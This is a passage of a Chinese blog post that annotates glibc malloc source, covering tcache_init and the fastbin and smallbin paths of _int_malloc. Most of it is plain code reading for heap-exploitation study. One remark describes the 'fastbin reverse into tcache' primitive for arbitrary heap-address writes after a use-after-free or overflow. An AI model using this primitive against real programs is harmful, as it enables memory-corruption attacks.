class="comment">//libc_hidden_def的作用:标志修饰的函数在动态链接的过程中进行延迟绑定。</span></span><br></pre></td></tr></table></figure><p>首先是进行了初始化操作,<code>ptmalloc_init</code>在后面分析了一些，建议先跳转到后面看一下，然后再回来(入栈式学习x)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!__malloc_initialized)</span><br><span class="line">ptmalloc_init ();</span><br></pre></td></tr></table></figure><p>之后tbytes转化成对应的tcache bin的idx之后进行<code>MAYBE_INIT_TCACHE</code>，可能需要初始化Tcache，这个宏对应的是<code>tcache_init()</code>函数(如果没有USE_TCACHE的话就是无事发生)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tcache == <span class="literal">NULL</span>)) \</span><br><span class="line">    tcache_init();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  <span class="comment">/* !USE_TCACHE */</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE()</span></span><br></pre></td></tr></table></figure><p>然后我们看看这个<code>tcache_init</code>函数(感觉这里应该归为下面的初始化操作),这个函数在之前介绍tcache的宏的时候说过，但是这里为了完整性还是再分析一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//获取tcache_perthread_struct的size，</span></span><br><span class="line">   <span class="comment">//tcache_perthread_struct的定义如下,是一个存放tcache bin以及相应chunk数亮的结构体</span></span><br><span class="line">    <span class="comment">/*typedef struct tcache_perthread_struct</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  uint16_t counts[TCACHE_MAX_BINS];</span></span><br><span class="line"><span class="comment">  tcache_entry *entries[TCACHE_MAX_BINS];</span></span><br><span class="line"><span class="comment">&#125; tcache_perthread_struct;   */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//获取arena与victim内存</span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//如果victim申请没成功，则再次调用申请，而ar_ptr似乎在arena_get_retry中被重置成了&amp;main_arena</span></span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//申请成功，初始化</span></span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是arena_get获取arena，其宏定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line">      ptr = thread_arena;<span class="comment">//获取thread_arena，这个是一个全局变量，在ptmalloc_init被初始化成了 &amp;main_arena  \</span></span><br><span class="line">      arena_lock (ptr, size);      \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line">，</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lock(ptr, size) do &#123;      \ <span class="comment">//如果ptr不为空，则调用__libc_lock_lock上锁</span></span></span><br><span class="line">      <span class="keyword">if</span> (ptr)      \</span><br><span class="line">        __libc_lock_lock (ptr-&gt;mutex);      \</span><br><span class="line">      <span class="keyword">else</span>      \</span><br><span class="line">        ptr = arena_get2 ((size), <span class="literal">NULL</span>);      \<span class="comment">//若ptr不为空，则调用arena_get2获取ptr</span></span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后调用<code>_int_malloc</code>获取一个内存(这个函数也是之后分析的重点，重中之重)，之后就是给tcache赋值，然后置零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (victim)</span><br><span class="line">&#123;</span><br><span class="line">    tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">    <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把Tcache的初始化分析完之后我们再返回_libc_malloc中，然后是这句语句,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache <span class="comment">//判断返回的tc_idx是否合理，tcache是否存在，tcache相应的bin是否有free的chunk，如果是则调用tcache_get获取</span></span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    victim = tcache_get (tc_idx);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果tcache没有的话，则我们就要调用<code>_int_malloc</code>获取内存(其实观察<code>_libc_malloc</code>后面还有对是否单线程等的判断，不过最终还是调用<code>_int_malloc</code>函数进行获取chunk)</p><p>那么接下来我们着重整理一下<code>_int_malloc</code>的流程，这个函数比<code>_libc_malloc</code>要复杂许多，归根结底<code>__libc_malloc</code>只是做了一些检查初始化，以及从tcache bin中检查是否有合适块的操作，如果没有的话最后还是调用<code>_int_malloc</code>，去找其他bins中的chunk</p><h5 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h5><p>这个函数的实现差不多有700行，全贴上来有点过于低能了。所以就按照流程逐步的分析。大致来说，<code>_int_malloc</code>在接收到分配请求时，会依次从<code>fastbin</code>、<code>small bin</code>中检索，如果大小处于<code>large bin</code>当中，则会首先检查是否有fastchunk,如果有则调用<code>malloc_consolidate</code>进行堆块的前向和后向合并。然后再到<code>unsorted bin</code>中检索，若没有则再到对应size的<code>large bin</code>中检索，如果还是没有则到其他size的<code>large bin</code>中检索。如果最终还是没有，则需要到<code>top chunk</code>中检索。以下将按顺序整理malloc的整个流程。</p><h6 id="声明与初始化阶段"><a href="#声明与初始化阶段" class="headerlink" title="声明与初始化阶段"></a>声明与初始化阶段</h6><p>在函数的开头进写了一些声明与初始化操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_count;    <span class="comment">/* count of unsorted chunks processed */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size returns false for request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//如果size不合理，返回错误</span></span><br><span class="line">  <span class="keyword">if</span> (!checked_request2size (bytes, &amp;nb))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">    <span class="comment">//如果没有用到的arenas，调用sysmalloc从mmap得到一个chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//这里定义了一个宏，方便我们在多线程的时候保持数据一致性。其作用是从刚刚得到的空闲chunk链表指针中取出第一个空闲的chunk(victim)，并将链表头设置为该空闲chunk的下一个chunk(victim-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line">  <span class="keyword">do</span>\</span><br><span class="line">    &#123;\</span><br><span class="line">      victim = pp;\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)\</span><br><span class="line"><span class="keyword">break</span>;\</span><br><span class="line">      pp = REVEAL_PTR (victim-&gt;fd);                                     \</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (pp != <span class="literal">NULL</span> &amp;&amp; misaligned_chunk (pp)))       \</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected&quot;</span>); \</span><br><span class="line">    &#125;\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \</span><br><span class="line"> != victim);\</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="fastbin阶段"><a href="#fastbin阶段" class="headerlink" title="fastbin阶段"></a>fastbin阶段</h6><p>如果大小小于get_max_fast()，则我们会首先在fastbin中进行检索</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    mchunkptr pp;</span><br><span class="line">    victim = *fb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">    stash them in the tcache.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">  &#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">      &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>总体流程可以分为两步:</p><ul><li>找chunk</li><li>fastbin reverse into tcache</li></ul><p>首先根据大小找到对应fastbin的index，然后获取fastbinY指针 fb取其第一个chunk为victim</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">idx = fastbin_index (nb);</span><br><span class="line">mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">mchunkptr pp;</span><br><span class="line">victim = *fb;</span><br></pre></td></tr></table></figure><p>如果这个victim不为NULL(也就是说对应fastbin中有空闲的chunk)则进行检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim))) <span class="comment">//检查是否对齐</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P) <span class="comment">//根据多线程与否，取出fastbin第一个chunk，然后将fastbin设置为第二个chunk(就是把第一个链表元素取出的操作)</span></span><br><span class="line">  *fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  REMOVE_FB (fb, pp, victim);</span><br><span class="line"><span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">  &#123; <span class="comment">//取出之后检查该chunk的size是否符合位于当前fastbin的index(也就是检查它的size是否被篡改了)</span></span><br><span class="line">    <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">    check_remalloced_chunk (av, victim, nb);</span><br></pre></td></tr></table></figure><p>然后便是喜闻乐见的<code>fastbin reverse into tcache</code>的操作,这个在之前的博客里面分析过。如果我们有一个UAF或者溢出，便可以利用它进行在任意地址上写一个堆地址(如果没有指针加密操作的话)。我们在这里再分析一下他的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">    stash them in the tcache.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="comment">//首先判断tcache是否错在，并且nb对应的idx小于 mp_.tcache_bins</span></span><br><span class="line">  &#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">          <span class="comment">//把剩余的fastbin中的东西挪到tcache中</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">      &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>) <span class="comment">//循环终止的条件可能有两个:1、该大小的tcache bin满了 2、fastbin 空了</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))<span class="comment">//检查对齐</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = REVEAL_PTR (tc_victim-&gt;fd); <span class="comment">//取出第一个chunk为tc_victim</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        tcache_put (tc_victim, tc_idx);<span class="comment">//调用tcache_put把tc_victim放入tc_idx对应的tcache bin中</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>最后将第一步得到的chunk指针进行一个chunk2mem操作，然后调用alloc_pertub，将其内容清空之后返回给用户</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure><h6 id="smallbin阶段"><a href="#smallbin阶段" class="headerlink" title="smallbin阶段"></a>smallbin阶段</h6><p>如果nb的范围在smallbin里面，则和刚刚一样进行一个搜索，同时也有一个类似<code>fastbin reverse into tcache</code>的操作。但是和在fastbin不同，smallbin是以双向链表组织的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">      stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">        &amp;&amp; 